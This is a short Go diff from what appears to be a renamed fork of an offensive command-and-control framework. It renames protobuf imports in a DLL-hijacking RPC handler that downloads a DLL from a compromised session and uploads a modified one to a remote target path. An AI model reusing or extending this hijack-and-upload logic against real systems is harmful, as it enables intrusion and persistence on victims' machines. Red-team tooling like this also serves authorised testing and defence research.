@@ -33,7 +33,7 @@ import (
 
 	"github.com/starkzarn/glod/protobuf/clientpb"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"github.com/starkzarn/glod/server/codenames"
 	"github.com/starkzarn/glod/server/core"
 	"github.com/starkzarn/glod/server/cryptography"
@@ -62,7 +62,7 @@ func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*
 
 	// download reference DLL if we don't have one in the request
 	if len(req.ReferenceDLL) == 0 {
-		download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
+		download, err := rpc.Download(context.Background(), &glodpb.DownloadReq{
 			Request: &commonpb.Request{
 				SessionID: session.ID,
 				Timeout:   int64(30),
@@ -145,7 +145,7 @@ func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*
 	// upload new dll
 	uploadGzip := new(encoders.Gzip).Encode(targetBytes)
 	// upload to remote target
-	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
+	upload, err := rpc.Upload(context.Background(), &glodpb.UploadReq{
 		Encoder: "gzip",
 		Data:    uploadGzip,
 		Path:    req.TargetLocation,
